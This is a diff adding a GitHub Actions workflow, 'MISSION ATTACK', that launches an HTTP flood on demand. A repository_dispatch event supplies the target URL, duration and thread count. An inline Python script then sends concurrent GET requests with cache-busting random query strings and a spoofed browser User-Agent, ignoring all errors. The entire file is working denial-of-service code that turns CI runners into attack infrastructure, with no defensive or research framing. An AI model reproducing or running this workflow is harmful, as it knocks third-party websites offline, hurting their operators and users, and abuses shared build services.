@@ -1,0 +1,67 @@
+name: 🔥 MISSION ATTACK
+
+on:
+  repository_dispatch:
+    types: [launch-attack]
+
+jobs:
+  attack:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - name: ⚡ CHECKOUT
+        uses: actions/checkout@v4
+
+      - name: 🐍 PYTHON SETUP
+        uses: actions/setup-python@v5
+        with:
+          python-version: '3.11'
+
+      - name: 📦 INSTALL
+        run: pip install aiohttp
+
+      - name: 💣 EXECUTE ATTACK
+        env:
+          TARGET: ${{ github.event.client_payload.target }}
+          DURATION: ${{ github.event.client_payload.duration }}
+          THREADS: ${{ github.event.client_payload.threads }}
+        run: |
+          echo "🎯 TARGET: $TARGET"
+          echo "⏱️ DURATION: $DURATION sec"
+          echo "🧵 THREADS: $THREADS"
+          python -c "
+import asyncio
+import aiohttp
+import os
+import random
+import sys
+import time
+
+TARGET = os.environ['TARGET']
+DURATION = int(os.environ['DURATION'])
+THREADS = int(os.environ['THREADS'])
+
+print(f'[+] MISSION START: {TARGET}')
+print(f'[+] DURATION: {DURATION}s, THREADS: {THREADS}')
+
+async def warrior(session, url, stop):
+    while not stop.is_set():
+        try:
+            rand_url = url + ('&' if '?' in url else '?') + f'_{random.random()}_{int(time.time()*1000)}'
+            async with session.get(rand_url, timeout=3) as resp:
+                await resp.read()
+        except:
+            await asyncio.sleep(0)
+
+async def main():
+    connector = aiohttp.TCPConnector(limit=THREADS, force_close=True, limit_per_host=THREADS)
+    async with aiohttp.ClientSession(connector=connector, headers={'User-Agent': 'Mozilla/5.0'}) as session:
+        stop = asyncio.Event()
+        tasks = [asyncio.create_task(warrior(session, TARGET, stop)) for _ in range(THREADS)]
+        await asyncio.sleep(DURATION)
+        stop.set()
+        await asyncio.gather(*tasks, return_exceptions=True)
+    print('[+] MISSION COMPLETE')
+
+asyncio.run(main())
+"
